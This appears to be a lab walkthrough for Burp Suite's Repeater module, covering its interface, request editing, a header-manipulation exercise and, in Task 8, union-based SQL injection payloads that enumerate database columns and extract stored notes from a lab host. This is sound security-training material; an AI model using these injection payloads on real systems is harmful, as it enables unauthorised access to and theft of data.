# Burp Suite: Repeater

## Task 1: Introduction

Welcome to the Burp Suite Repeater module guide. In this document, we'll cover advanced functionalities of Burp Suite, specifically focusing on the Repeater module. If you haven't completed the basics, please refer [here](https://github.com/yourusername/burp-basics).

---

## Task 2: What is Repeater?

Burp Suite Repeater allows for editing and resending HTTP requests, which makes it perfect for detailed, manual testing of web endpoints.

### Repeater Interface:

![Repeater Interface](https://github.com/user-attachments/assets/9ca40128-05ff-418e-8f9c-cf23ec292f83)

1. **Request List:** Track and manage multiple requests.
2. **Request Controls:** Send, cancel, or navigate request history.
3. **Request and Response View:** Edit requests and inspect server responses.
4. **Layout Options:** Customize the display of request and response.
5. **Inspector:** Intuitive breakdown and editing of request components.
6. **Target:** URL or IP destination of the request.

---

## Task 3: Basic Usage

Typically, you'll capture requests through the Proxy and forward them to Repeater for further testing.

1. Capture a request via Proxy and send it to Repeater:

![Initial Capture](https://github.com/user-attachments/assets/934417f4-7ed8-4c78-8cbb-332b10f2c1c1)

2. Click "Send" and inspect the response:

![Response Received](https://github.com/user-attachments/assets/81650379-5b5c-48a3-aca4-87d10db60a53)

3. Edit headers (e.g., set "Connection: open") and resend:

![Edited Header](https://github.com/user-attachments/assets/36957c1d-bdc7-42ec-9f7d-f59f8db40081)

---

## Task 4: Message Analysis Toolbar

Burp Suite provides different viewing options for requests and responses:

![Viewing Options](https://github.com/user-attachments/assets/e8eb2c0e-aea4-4793-a5eb-1fc7e1b53f28)

* **Pretty:** Default readable format.
* **Raw:** Direct server response.
* **Hex:** Byte-level inspection.
* **Render:** Visual representation as in a web browser.

---

## Task 5: Inspector

Inspector provides an easy way to analyze and modify request elements:

![Inspector Overview](https://github.com/user-attachments/assets/a2b2f4d5-ecbf-4936-a6fe-4ebdfae9e7d2)

You can edit attributes such as HTTP methods, headers, cookies, and parameters easily:

![Inspector Request Attributes](https://github.com/user-attachments/assets/36a5cae9-bc9f-47e2-8d34-4d04a96fd382)

---

## Task 6: Practical Example

Use Repeater to test header manipulation:

1. Capture request to your target (e.g., http\://MACHINE\_IP/).
2. Add header `FlagAuthorised: True`:

```http
GET / HTTP/1.1
Host: MACHINE_IP
User-Agent: Mozilla/5.0
Accept: text/html
FlagAuthorised: True
```

Send and inspect changes.

---

## Task 7: Challenge

Navigate to `/products/` endpoint, find numeric endpoints like `/products/3`. Validate proper integer handling by manipulating endpoint URLs.

---

## Task 8: Extra-mile Challenge (SQL Injection)

Identify and exploit a Union SQL Injection on `/about/ID` endpoint to retrieve hidden notes:

1. Confirm SQLi by injecting an apostrophe (`'`) after ID and check for errors.
2. Use UNION queries to enumerate column names:

```sql
/about/0 UNION ALL SELECT group_concat(column_name),null,null,null,null FROM information_schema.columns WHERE table_name="people"
```

![Enumerated Columns](https://github.com/user-attachments/assets/b13ae1cd-a71b-4cca-9ac6-c8e31a67a42a)

3. Extract sensitive data:

```sql
/about/0 UNION ALL SELECT notes,null,null,null,null FROM people WHERE id = 1
```

![Extracted Data](https://github.com/user-attachments/assets/93765c1d-a2bb-4b9d-88d3-97bda1846068)

---

## Task 9: Conclusion

You've successfully learned advanced Repeater functionalities within Burp Suite. Next, explore automated request testing with Burp Suite Intruder.

Good luck!
